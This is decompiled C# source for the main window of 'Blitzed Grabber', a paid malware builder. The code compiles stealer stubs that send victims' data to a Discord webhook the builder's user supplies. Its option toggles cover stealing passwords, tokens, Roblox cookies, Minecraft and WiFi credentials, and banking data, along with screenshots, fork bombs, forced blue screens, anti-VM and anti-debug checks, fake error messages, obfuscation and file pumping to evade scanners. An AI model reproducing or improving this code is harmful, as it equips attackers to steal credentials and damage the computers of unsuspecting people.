using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using BlitzedConfuser;
using BlitzedGrabber.Properties;
using MetroFramework;
using MetroFramework.Controls;
using MetroFramework.Forms;
using Microsoft.CSharp;

namespace BlitzedGrabber
{
	// Token: 0x0200001E RID: 30
	public partial class Form1 : MetroForm
	{
		// Token: 0x0600006E RID: 110 RVA: 0x00005470 File Offset: 0x00003870
		[Obsolete]
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00005480 File Offset: 0x00003880
		private void Form1_Load(object sender, EventArgs e)
		{
			if (!new WebClient().DownloadString("https://raw.githubusercontent.com/StvnedEagle1337/Stuff/main/BlitzedGrabber/FreeTrial.cs").Contains("True"))
			{
				MessageBox.Show("Trial Version has ended. Buy for 10$ on the discord Server! Note: Stubs that u have made will still work!");
				Environment.Exit(0);
				Process.GetCurrentProcess().Kill();
				Process.GetCurrentProcess().Kill();
				Process.GetCurrentProcess().Kill();
				Application.Exit();
				base.Close();
				Thread.Sleep(323232);
				Thread.Sleep(323232);
				Thread.Sleep(323232);
				Thread.Sleep(323232);
				Thread.Sleep(323232);
				Thread.Sleep(323232);
				Thread.Sleep(323232);
				Thread.Sleep(323232);
			}
			this.metroTabControl2.SelectedTab = this.metroTabControl2.SelectedTab;
			if (Program.GetValue("Webhook") != null)
			{
				this.webhookTextBox.Text = Program.GetValue("Webhook");
			}
			if (Program.GetValue("FileName") != null)
			{
				this.fileNameTextBox.Text = Program.GetValue("FileName");
			}
			if (Program.GetValue("TopMost") != null)
			{
				string value = Program.GetValue("TopMost");
				this.TopMostCheckBox.Checked = Convert.ToBoolean(value);
				base.TopMost = Convert.ToBoolean(value);
			}
		}

		// Token: 0x06000070 RID: 112 RVA: 0x000055C4 File Offset: 0x000039C4
		public void ExecuteCommandSync(object command)
		{
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd", "/c " + ((command != null) ? command.ToString() : null));
				processStartInfo.RedirectStandardOutput = true;
				processStartInfo.UseShellExecute = false;
				processStartInfo.CreateNoWindow = true;
				Process process = new Process();
				process.StartInfo = processStartInfo;
				process.Start();
				Console.WriteLine(process.StandardOutput.ReadToEnd());
			}
			catch
			{
			}
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00005640 File Offset: 0x00003A40
		[Obsolete]
		public void CompileStub()
		{
			this.compilerOutputTextBox.Text = "";
			ICodeCompiler codeCompiler = new CSharpCodeProvider(new Dictionary<string, string> { { "CompilerVersion", "v4.0" } }).CreateCompiler();
			string outputAssembly = this.fileNameTextBox.Text + ".exe";
			CompilerParameters compilerParameters = new CompilerParameters();
			compilerParameters.GenerateExecutable = true;
			compilerParameters.OutputAssembly = outputAssembly;
			compilerParameters.ReferencedAssemblies.Add("System.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Net.Http.dll");
			compilerParameters.ReferencedAssemblies.Add("System.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Core.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Security.dll");
			compilerParameters.ReferencedAssemblies.Add("netstandard.dll");
			compilerParameters.ReferencedAssemblies.Add("System.ObjectModel.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
			compilerParameters.ReferencedAssemblies.Add("APIFOR.dll");
			compilerParameters.TreatWarningsAsErrors = false;
			string text = Resources.Program;
			string newValue = Base64.Base64Encode(this.webhookTextBox.Text);
			if (!string.IsNullOrEmpty(this.iconPathTextBox.Text))
			{
				compilerParameters.CompilerOptions = string.Format("/target:winexe /win32icon:{0}", this.iconPathTextBox.Text);
			}
			if (string.IsNullOrEmpty(this.webhookTextBox.Text))
			{
				MessageBox.Show("You need to put a webhook in the webhook textbox lol");
				this.metroTabControl2.SelectedTab = this.optionsTab;
				return;
			}
			text = text.Replace("//INSERT_WEBHOOK//", newValue);
			text = text.Replace("//ANTIVM//", this.AntiVMCheckbox.Checked.ToString().ToLower() + ";");
			text = text.Replace("//ANTIHACKER//", this.AntiProcessHackerCheckBox.Checked.ToString().ToLower() + ";");
			text = text.Replace("//DEBUGMODE//", this.DebugModeOn.Checked.ToString().ToLower() + ";");
			text = text.Replace("//ANTIDEBUG//", this.AntiDebugCheckBox.Checked.ToString().ToLower() + ";");
			text = text.Replace("//ANTIHTTPDEBUG//", this.AntiHTTPDebugCheckBox.Checked.ToString().ToLower() + ";");
			if (this.fakeErrorCheckBox.Checked)
			{
				text = text.Replace("//FAKETEXTBOXERROR//", string.Concat(new string[]
				{
					"FakeError(\"",
					this.errorMessageTextBox.Text,
					"\",\"",
					this.errorTitleTextBox.Text,
					"\");"
				}));
			}
			text = text.Replace("//CRASHDISCORDD//", this.CrashDiscordCheckBox.Checked.ToString().ToLower() + ";");
			text = text.Replace("//GETPASSWORDS//", this.passwordcheckbox.Checked.ToString().ToLower() + ";");
			text = text.Replace("//PCSTEAlA//", this.pcinfocheckbox.Checked.ToString().ToLower() + ";");
			text = text.Replace("//ROBLOXCOOKIESTEAL//", this.rbxcookiecheckbox.Checked.ToString().ToLower() + ";");
			text = text.Replace("//CAPTURESCREEN//", this.PCScreenShotCheckbox.Checked.ToString().ToLower() + ";");
			text = text.Replace("//GATHERTOKENS//", this.tokensCheckBox.Checked.ToString().ToLower() + ";");
			text = text.Replace("//STEALMINECRAFT//", this.MinecraftCheckBox.Checked.ToString().ToLower() + ";");
			text = text.Replace("//TAKEWIFIPASSWORDS//", this.WIFIPasswordsCheckBox.Checked.ToString().ToLower() + ";");
			text = text.Replace("//FORKBOMBER//", this.ForkBombCheckBox.Checked.ToString().ToLower() + ";");
			text = text.Replace("//RESTARTYESORNO//", this.restartpccheckbox.Checked.ToString().ToLower() + ";");
			text = text.Replace("//SHUTDOWNPC//", this.shutdownpccheckbox.Checked.ToString().ToLower() + ";");
			text = text.Replace("//DOBSOD//", this.bsodcheckbox.Checked.ToString().ToLower() + ";");
			string[] sources = new string[]
			{
				text,
				Resources.Rich,
				Resources.Devil,
				Resources.ErrorHandling,
				Resources.Grabbing,
				Resources.aesgem,
				Resources.Counter,
				Resources.SQLite,
				Resources.SQLReader,
				Resources.cbcrypt,
				Resources.IniFile,
				Resources.Wifi,
				Resources.Crypto,
				Resources.StringsCrypt,
				Resources.Paths,
				Resources.CommandHelper,
				Resources.Handler,
				Resources.Banking,
				Resources.Minecraft
			};
			CompilerResults compilerResults = codeCompiler.CompileAssemblyFromSourceBatch(compilerParameters, sources);
			if (this.filePumperCheckBox.Checked)
			{
				if (this.kiloByteCheckBox.Checked)
				{
					if (Regex.IsMatch(this.pumpAmountTextBox.Text, "^[a-zA-Z]+$"))
					{
						MessageBox.Show("Invalid File Pump Amount", "Error Compiling");
					}
					FileStream fileStream = File.OpenWrite(this.fileNameTextBox.Text + ".exe");
					long num = fileStream.Seek(0L, SeekOrigin.End);
					decimal d = Convert.ToInt64(this.pumpAmountTextBox.Text) * 1024L;
					while (num < d)
					{
						num += 1L;
						fileStream.WriteByte(0);
					}
					fileStream.Close();
				}
				else if (this.megaByteCheckBox.Checked)
				{
					if (Regex.IsMatch(this.pumpAmountTextBox.Text, "^[a-zA-Z]+$"))
					{
						MessageBox.Show("Invalid File Pump Amount", "Error Compiling");
					}
					FileStream fileStream2 = File.OpenWrite(this.fileNameTextBox.Text + ".exe");
					long num2 = fileStream2.Seek(0L, SeekOrigin.End);
					decimal d2 = Convert.ToInt64(this.pumpAmountTextBox.Text) * 1024L * 1024L;
					while (num2 < d2)
					{
						num2 += 1L;
						fileStream2.WriteByte(0);
					}
					fileStream2.Close();
				}
				else if (this.GigaByteCheckbox.Checked)
				{
					if (Regex.IsMatch(this.pumpAmountTextBox.Text, "^[a-zA-Z]+$"))
					{
						MessageBox.Show("Invalid File Pump Amount", "Error Compiling");
					}
					FileStream fileStream3 = File.OpenWrite(this.fileNameTextBox.Text + ".exe");
					long num3 = fileStream3.Seek(0L, SeekOrigin.End);
					decimal d3 = Convert.ToInt64(this.pumpAmountTextBox.Text) * 1024L * 1024L * 1024L;
					while (num3 < d3)
					{
						num3 += 1L;
						fileStream3.WriteByte(0);
					}
					fileStream3.Close();
				}
			}
			if (compilerResults.Errors.Count > 0)
			{
				foreach (object obj in compilerResults.Errors)
				{
					CompilerError compilerError = (CompilerError)obj;
					this.compilerOutputTextBox.Text = string.Concat(new string[]
					{
						this.compilerOutputTextBox.Text,
						Environment.NewLine,
						compilerError.FileName,
						Environment.NewLine,
						"Line number ",
						compilerError.Line.ToString(),
						", Error Number: ",
						compilerError.ErrorNumber,
						", '",
						compilerError.ErrorText,
						";"
					});
				}
				this.compilerOutputTextBox.Text = this.compilerOutputTextBox.Text + Environment.NewLine + "An error has occured when trying to compile file.";
				return;
			}
			this.compilerOutputTextBox.Text = string.Concat(new string[]
			{
				this.compilerOutputTextBox.Text,
				Environment.NewLine,
				"Successfully compiled stub!",
				Environment.NewLine,
				"Enjoy!"
			});
			try
			{
				Kappa.Obfuscate(this.fileNameTextBox.Text + ".exe");
			}
			catch
			{
				string str = this.fileNameTextBox.Text.Replace(" ", "?") + ".exe";
				File.WriteAllText("Compile.bat", "cd " + Form1.currentDir + " && del " + str);
				Process.Start("Compile.bat");
			}
			Process.Start("explorer.exe", "c:\\Users\\" + Environment.UserName + "\\Pictures");
			string str2 = this.fileNameTextBox.Text.Replace(" ", "?") + ".exe";
			File.WriteAllText("Compile.bat", "cd " + Form1.currentDir + " && del " + str2);
			Process.Start("Compile.bat");
			try
			{
				File.Delete("c:\\Users\\" + Environment.UserName + "\\Pictures\\APIFOR.dll");
			}
			catch
			{
			}
			try
			{
				File.Copy("APIFOR.dll", "c:\\Users\\" + Environment.UserName + "\\Pictures\\APIFOR.dll");
			}
			catch
			{
			}
			MessageBox.Show("Your stub is the one that has The word blitzed at the end! MAKE SURE APIFOR.dll IS IN THE SAME DIRECTORY AS YOUR EXE");
			Application.Restart();
		}

		// Token: 0x06000072 RID: 114 RVA: 0x000060E0 File Offset: 0x000044E0
		private void groupBox1_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x06000073 RID: 115 RVA: 0x000060E2 File Offset: 0x000044E2
		private void addButton_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000074 RID: 116 RVA: 0x000060E4 File Offset: 0x000044E4
		private void robloxCheckBox_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000075 RID: 117 RVA: 0x000060E6 File Offset: 0x000044E6
		private void cookiesCheckBox_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000076 RID: 118 RVA: 0x000060E8 File Offset: 0x000044E8
		private void passwordsCheckBox_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000077 RID: 119 RVA: 0x000060EC File Offset: 0x000044EC
		[Obsolete]
		private void compileButton_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.fileNameTextBox.Text))
			{
				this.fileNameTextBox.Text = "stub";
			}
			Program.SetValue("Webhook", this.webhookTextBox.Text);
			Program.SetValue("FileName", this.fileNameTextBox.Text);
			Form1.filenameyuh = this.fileNameTextBox.Text + ".exe";
			this.CompileStub();
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00006165 File Offset: 0x00004565
		private void metroCheckBox10_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00006167 File Offset: 0x00004567
		private void iconCheckBox_CheckedChanged_1(object sender, EventArgs e)
		{
			if (this.iconCheckBox.Checked)
			{
				this.chooseIconButton.Enabled = true;
				return;
			}
			this.chooseIconButton.Enabled = false;
		}

		// Token: 0x0600007A RID: 122 RVA: 0x00006190 File Offset: 0x00004590
		private void metroButton4_Click(object sender, EventArgs e)
		{
			if (this.fileNameTextBox.Text == "")
			{
				MessageBox.Show("File Name Is Empty, Will Cause Errors");
				return;
			}
			if (this.fileNameTextBox.Text.Length > 260)
			{
				MessageBox.Show("File Name Is Too Long, Will Cause Errors");
				return;
			}
			if (this.fileNameTextBox.Text.Contains("//") | this.fileNameTextBox.Text.Contains("\\"))
			{
				MessageBox.Show("File Name Has Invalid Characters, Will Cause Errors");
				return;
			}
			if (this.fileNameTextBox.Text.Contains("<") | this.fileNameTextBox.Text.Contains(">"))
			{
				MessageBox.Show("File Name Has Invalid Characters, Will Cause Errors");
				return;
			}
			MessageBox.Show("File Name Is Good");
		}

		// Token: 0x0600007B RID: 123 RVA: 0x00006260 File Offset: 0x00004660
		private void metroTabControl2_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600007C RID: 124 RVA: 0x00006262 File Offset: 0x00004662
		private void testWebhookButton_Click_1(object sender, EventArgs e)
		{
			new WebhookFunctions().sendwebhook(this.webhookTextBox.Text, "This webhooks working!", "Blitzed Grabber");
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00006284 File Offset: 0x00004684
		private void chooseIconButton_Click_1(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "ico file (*.ico)|*.ico";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.iconPathTextBox.Text = openFileDialog.FileName;
					this.iconPictureBox.BackgroundImage = Image.FromFile(openFileDialog.FileName);
					this.iconPictureBox.BackgroundImageLayout = ImageLayout.Stretch;
				}
				else
				{
					this.iconPathTextBox.Text = "";
				}
			}
		}

		// Token: 0x0600007E RID: 126 RVA: 0x0000630C File Offset: 0x0000470C
		private void filePumperCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			if (this.filePumperCheckBox.Checked)
			{
				this.pumpAmountTextBox.Enabled = this.filePumperCheckBox.Checked;
				this.kiloByteCheckBox.Enabled = this.filePumperCheckBox.Checked;
				this.megaByteCheckBox.Enabled = this.filePumperCheckBox.Checked;
				this.GigaByteCheckbox.Enabled = this.filePumperCheckBox.Checked;
				return;
			}
			this.pumpAmountTextBox.Enabled = this.filePumperCheckBox.Checked;
			this.kiloByteCheckBox.Enabled = this.filePumperCheckBox.Checked;
			this.megaByteCheckBox.Enabled = this.filePumperCheckBox.Checked;
			this.GigaByteCheckbox.Enabled = this.filePumperCheckBox.Checked;
		}

		// Token: 0x0600007F RID: 127 RVA: 0x000063D7 File Offset: 0x000047D7
		private void metroCheckBox6_CheckedChanged(object sender, EventArgs e)
		{
			if (this.TopMostCheckBox.Checked)
			{
				base.TopMost = true;
				Program.SetValue("TopMost", "true");
				return;
			}
			base.TopMost = false;
			Program.SetValue("TopMost", "false");
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00006413 File Offset: 0x00004813
		private void kiloByteCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			this.megaByteCheckBox.Checked = false;
			this.GigaByteCheckbox.Checked = false;
			this.kiloByteCheckBox.Checked = this.kiloByteCheckBox.Checked;
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00006443 File Offset: 0x00004843
		private void GigaByteCheckbox_CheckedChanged(object sender, EventArgs e)
		{
			this.megaByteCheckBox.Checked = false;
			this.kiloByteCheckBox.Checked = false;
			this.GigaByteCheckbox.Checked = this.GigaByteCheckbox.Checked;
		}

		// Token: 0x06000082 RID: 130 RVA: 0x00006473 File Offset: 0x00004873
		private void megaByteCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			this.GigaByteCheckbox.Checked = false;
			this.kiloByteCheckBox.Checked = false;
			this.megaByteCheckBox.Checked = this.megaByteCheckBox.Checked;
		}

		// Token: 0x06000083 RID: 131 RVA: 0x000064A3 File Offset: 0x000048A3
		private void fileNameTextBox_KeyDown(object sender, KeyEventArgs e)
		{
			if (e.KeyCode == Keys.Return)
			{
				this.CompileStub();
			}
		}

		// Token: 0x06000084 RID: 132 RVA: 0x000064B5 File Offset: 0x000048B5
		private void metroTextBox2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000085 RID: 133 RVA: 0x000064B8 File Offset: 0x000048B8
		private void metroButton1_Click(object sender, EventArgs e)
		{
			WebhookFunctions webhookFunctions = new WebhookFunctions();
			string webhookurl = new WebClient().DownloadString("https://raw.githubusercontent.com/StvnedEagle1337/Stuff/main/BlitzedGrabber/Webhook.cs");
			webhookFunctions.sendwebhook(webhookurl, this.discorduserappsuggestionstextbox.Text, this.appsuggestionstextbox.Text);
		}

		// Token: 0x06000086 RID: 134 RVA: 0x000064F6 File Offset: 0x000048F6
		private void fakeErrorCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			this.errorMessageTextBox.Enabled = this.fakeErrorCheckBox.Checked;
			this.errorTitleTextBox.Enabled = this.fakeErrorCheckBox.Checked;
		}

		// Token: 0x04000020 RID: 32
		public static string currentDir = Directory.GetCurrentDirectory();

		// Token: 0x04000021 RID: 33
		public static string filenameyuh = "";

		// Token: 0x04000022 RID: 34
		public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");

		// Token: 0x04000023 RID: 35
		public static string strExeFilePath = AppDomain.CurrentDomain.BaseDirectory;
	}
}
